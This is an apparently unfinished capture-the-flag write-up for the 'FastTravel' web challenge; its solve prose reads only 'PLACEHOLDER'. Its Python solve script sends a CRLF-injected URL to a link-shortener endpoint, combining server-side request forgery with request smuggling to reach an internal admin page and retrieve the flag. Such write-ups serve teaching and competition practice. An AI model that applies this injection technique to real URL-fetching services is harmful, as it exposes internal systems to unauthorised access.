# FastTravel

## Description

```
The paths through the cyber world can be quite long. This is why we have set up a >FastTravel< network to shorten them. To avoid dangers we let you peek through them before you enter.
```

## Categories

- `web`

## Provided Files

- `fasttravel.zip`

## Solve Process

PLACEHOLDER

```py
import requests
from urllib.parse import quote

PAYLOAD = "http://127.0.0.1:5001/admin HTTP/1.1\r\nHost: localhost:5000\r\n\r\n"
CHALLENGE_HOST = "si56xggoi2mp9rmk.dyn.acsc.land"
REQUEST_PAYLOAD = f"source={quote(PAYLOAD)}"

print(f"[+] Payload is: {REQUEST_PAYLOAD}")
print("[+] Sending payload")
RESPONE = requests.post(url=f"https://{CHALLENGE_HOST}/shorten", data=REQUEST_PAYLOAD, allow_redirects=True)
if RESPONE.status_code == 200:
    print("[+] Success")
    print(f"[+] Retrieve flag here: {RESPONE.url}")
else:
    print(f"[-] Payload returned with status: {RESPONE.status_code}")
```
